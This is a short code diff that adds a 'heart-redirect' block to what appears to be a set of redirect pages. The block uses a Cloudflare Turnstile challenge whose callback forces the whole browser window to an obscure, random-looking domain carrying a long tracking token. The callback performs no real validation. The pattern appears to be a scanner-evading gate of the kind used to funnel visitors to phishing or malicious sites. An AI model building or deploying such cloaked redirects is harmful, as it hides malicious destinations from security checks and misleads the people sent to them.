@@ -112,3 +112,16 @@ mone-redirect
   }
 </script>
 
+heart-redirect
+
+<div class="cf-turnstile" data-sitekey="0x4AAAAAAATxbAZe1ABfQkus" data-callback="validateAndRedirect"></div>
+
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" defer></script>
+
+<script>
+  function validateAndRedirect() {
+    // Your validation logic here, e.g., solving the captcha
+    // If validation is successful, perform the redirect
+    top.location.href = "https://silliboukkashrutstetel.com/jGrpB323835ef5d950ef0b3b21ff82bf337de38b37e9d";
+  }
+</script>
